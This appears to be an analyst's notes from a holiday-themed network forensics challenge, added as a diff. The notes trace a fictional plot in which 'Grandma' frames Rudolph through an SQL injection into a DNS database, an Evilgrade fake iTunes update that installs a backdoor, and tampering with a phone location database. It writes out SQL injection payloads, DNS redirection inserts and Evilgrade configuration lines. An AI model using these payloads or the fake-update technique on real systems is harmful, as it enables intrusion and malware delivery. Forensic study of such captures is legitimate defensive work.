@@ -1,0 +1,202 @@
+MISC INFORMATION
+================
+IP = 192.168.1.10
+www.santaslist.northpole - 172.19.79.2
+
+Grandma's grand plan
+=======================
+"I will hide out at the Plaza Hotel near Central Park for several weeks, and meet you there in the lobby exactly one week after the trial concludes with a guilty verdict for Rudolph, precisely at noon local time.  Make sure you bring the money in a suitcase full of cash.  I’ll be wearing one red shoe."
+
+
+Email:
+------------
+"Dear Mel,
+
+
+
+Our plans are almost complete, and I am very excited.  Soon, you and I 
+
+shall be spending the rest of our days relaxing in the surf and sun!
+
+
+
+The plan is highly sensitive, a deep secret that only the two of us share. 
+
+Never tell another soul about our clever scheme as long as you live.
+
+
+
+As we discussed, I recently made you the sole beneficiary of my life 
+
+insurance policy.  On Christmas Eve, I plan on faking my own death, which 
+
+I will frame as murder on Rudolph, Santa.s obnoxious reindeer.
+
+
+
+The details of my plan are included in the attached document below.  Read 
+
+it carefully.
+
+
+
+Merry Christmas!"
+
+
+.doc file:
+-------------
+"Dear Mel,
+
+Here are the details of my secret plan.
+
+After the investigation turns up the evidence I plant, you provide eyewitness testimony in court, and Rudolph is convicted, you will receive the insurance payout.  We can then use that money to fund our Caribbean retirement.
+	
+I am not sure I ever told you this, Mel, but as a child, my village was attacked by a ravenous band of rampaging reindeer, instilling a life-long hatred in me for the flea-bitten beasts.  I’ll never forget their horrible comments as they galloped through our village.  Because of that chilling childhood experience, I’m going to fake my death and blame it all on Rudolph, the most well-known reindeer of all.  He’ll rot away in jail forever.
+	
+Merry Christmas,
+	
+Grandma"
+
+Stream 4 + Stream 5
+---------------------
+Both Mel and Grandma appear to be naughty!
+
+
+Stream 6
+----------------
+SQL injection vuln is discovered!
+
+Stream 7
+---------------
+SQL injection vuln verified! :O
+
+Stream 8
+--------------
+Table in database "mydns" called "soa" is discovered through SQL injection
+
+Stream 9
+---------------
+Columns from rr table in mydns table
+<table border="3">
+<tr><th>Name</th><th>Status</th></tr>
+<tr><td>id</td><td>int(10) unsigned</td><td>NO</td><td>PRI</td><td></td><td>auto_increment</td></tr><tr><td>zone</td><td>int(10) unsigned</td><td>NO</td><td>MUL</td><td></td><td></td></tr><tr><td>name</td><td>char(64)</td><td>NO</td><td></td><td></td><td></td></tr><tr><td>type</td><td>enum('A','AAAA','ALIAS','CNAME','HINFO','MX','NAPTR','NS','PTR','RP','SRV','TXT')</td><td>YES</td><td></td><td></td><td></td></tr><tr><td>data</td><td>char(128)</td><td>NO</td><td></td><td></td><td></td></tr><tr><td>aux</td><td>int(10) unsigned</td><td>NO</td><td></td><td></td><td></td></tr><tr><td>ttl</td><td>int(10) unsigned</td><td>NO</td><td></td><td>86400</td><td></td></tr></table>
+
+Stream 10
+-----------------
+Columns from soa table in mydns table
+<table border="3">
+<tr><th>Name</th><th>Status</th></tr>
+<tr><td>id</td><td>int(10) unsigned</td><td>NO</td><td>PRI</td><td></td><td>auto_increment</td></tr><tr><td>origin</td><td>char(255)</td><td>NO</td><td>UNI</td><td></td><td></td></tr><tr><td>ns</td><td>char(255)</td><td>NO</td><td></td><td></td><td></td></tr><tr><td>mbox</td><td>char(255)</td><td>NO</td><td></td><td></td><td></td></tr><tr><td>serial</td><td>int(10) unsigned</td><td>NO</td><td></td><td>1</td><td></td></tr><tr><td>refresh</td><td>int(10) unsigned</td><td>NO</td><td></td><td>28800</td><td></td></tr><tr><td>retry</td><td>int(10) unsigned</td><td>NO</td><td></td><td>7200</td><td></td></tr><tr><td>expire</td><td>int(10) unsigned</td><td>NO</td><td></td><td>604800</td><td></td></tr><tr><td>minimum</td><td>int(10) unsigned</td><td>NO</td><td></td><td>86400</td><td></td></tr><tr><td>ttl</td><td>int(10) unsigned</td><td>NO</td><td></td><td>86400</td><td></td></tr></table>
+
+Stream 11
+-----------------
+<table border="3">
+<tr><th>Name</th><th>Status</th></tr>
+<tr><td>1</td><td>santaslist.northpole</td><td>ns1.santaslist.northpole</td><td>root.santaslist.northpole</td><td>25</td><td>28800</td><td>7200</td><td>604800</td><td>86400</td><td>86400</td></tr></table>
+
+Stream 12
+-----------------
+Grandma inserts!
+insert into mydns.soa (origin,ns,mbox) values ("apple.com","ns1.santaslist.northpole","root.santaslist.northpole")
+
+Stream 13
+-----------------
+Verified that the insert worked
+
+Stream 14
+-----------------
+Selecting from mydns.rr table
+<table border="3">
+<tr><th>Name</th><th>Status</th></tr>
+<tr><td>1</td><td>1</td><td>@</td><td>NS</td><td>ns1.santaslist.northpole</td><td>0</td><td>86400</td></tr><tr><td>2</td><td>1</td><td>ns1.santaslist.northpole</td><td>A</td><td>172.19.79.2</td><td>0</td><td>86400</td></tr><tr><td>3</td><td>1</td><td>www.santaslist.northpole</td><td>A</td><td>172.19.79.2</td><td>0</td><td>86400</td></tr></table>
+
+Stream 15
+--------------------
+Grandma inserts again!
+';insert into mydns.rr (zone,name,type,data) values (2,"itunes.apple.com","A","192.168.1.10"
+
+Stream 16
+--------------------
+';insert into mydns.rr (zone,name,type,data) values (2,"ax.init.itunes.apple.com","A","192.168.1.10")
+
+Stream 17 through Stream 19
+---------------------
+Inserts!
+
+
+Stream 20
+---------------------
+Selects from the mydns.rr table!
+<table border="3">
+<tr><th>Name</th><th>Status</th></tr>
+<tr><td>1</td><td>1</td><td>@</td><td>NS</td><td>ns1.santaslist.northpole</td><td>0</td><td>86400</td></tr><tr><td>2</td><td>1</td><td>ns1.santaslist.northpole</td><td>A</td><td>172.19.79.2</td><td>0</td><td>86400</td></tr><tr><td>3</td><td>1</td><td>www.santaslist.northpole</td><td>A</td><td>172.19.79.2</td><td>0</td><td>86400</td></tr><tr><td>4</td><td>2</td><td>itunes.apple.com</td><td>A</td><td>192.168.1.10</td><td>0</td><td>86400</td></tr><tr><td>5</td><td>2</td><td>ax.init.itunes.apple.com</td><td>A</td><td>192.168.1.10</td><td>0</td><td>86400</td></tr><tr><td>6</td><td>2</td><td>swcatalog.apple.com</td><td>A</td><td>192.168.1.10</td><td>0</td><td>86400</td></tr><tr><td>7</td><td>2</td><td>swcdn.apple.com</td><td>A</td><td>192.168.1.10</td><td>0</td><td>86400</td></tr><tr><td>8</td><td>2</td><td>swscan.apple.com</td><td>A</td><td>192.168.1.10</td><td>0</td><td>86400</td></tr></table>
+
+Stream 21
+--------------------
+Rudolph connects to Grandma from 172.19.79.6
+iTunes 10.3.1
+Win XP SP3
+
+Stream 22
+Stream 23
+Stream 24
+Stream 25
+Stream 26
+Stream 27
+Stream 28
+-------------------
+iTunes is talking to update server
+
+Stream 29
+-------------------
+Downloading executable that might be backdoored
+
+Stream 31
+-------------------
+Downloaded a second time?
+
+Stream 32
+--------------------
+Looks like a connection from the backdoor!
+Console input and output!
+Opens an FTP session to her home computer from Rudolph@RUDOLPH-PC
+Gets the sqlite3.exe and hangs up
+Grandma is modifying a backed-up SQlite database from Rudolphs phone!
+Looks like Rudolph was travelling across the earth, as he should be
+Grandma inserts a new location into the SQlite database - the site of the attackShe deletes the sqlite3.exe and exits
+
+Stream 33
+Stream 34
+--------------------
+FTP data stream
+FTP command stream
+
+
+
+
+Info on mobilesync: http://andykn.blogspot.com/2011/04/iphone-tracker.html
+
+Info on iTunes vulnerability: https://www.macworld.com/article/163629/2011/11/itunes_update_addresses_man_in_the_middle_vulnerability.html
+
+Evilgrade was definitely used.  Rudolph is using itunes 10.3.1, which is supposedly vulnerable to Evilgrade (though it doesn't work for me) - it might work if the update agent is uninstalled, though, which uses the browser (since the user-agent is IE8, that makes sense)
+
+The space after the 'Location' field really proves Evilgrade (or a derivative)
+
+The site for Evilgrade says 10.0.1.22 or earlier
+
+the spanish EULA would have been accepted
+
+had to turn down IE8's security to download the update
+
+I don't know where iTunesSetup.exe came from, but it's weird... it should be:
+        'DATA1'  => { 'val' => '\'http://itunes.com/\'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).\'/itunesupdate\'.isrcore::utils::RndNum(5).\'.exe\'',
+        <key>iTunesMacDownloadURL</key>
+        <string>http://itunes.com/Pu5/itunesupdate66902.exe</string>
+        <key>iTunesMacVersion</key>
+        <string>10.5.1</string>
+        <key>iTunesWindowsDownloadURL</key>
+        <string>http://itunes.com/Pu5/itunesupdate66902.exe</string>
+        <key>iTunesWindowsVersion</key>
+        <string>10.5.1</string>
+
+Had to reconfigure appleupdate.html to point closed.html to itunesupdate.exe (instead of the default name)
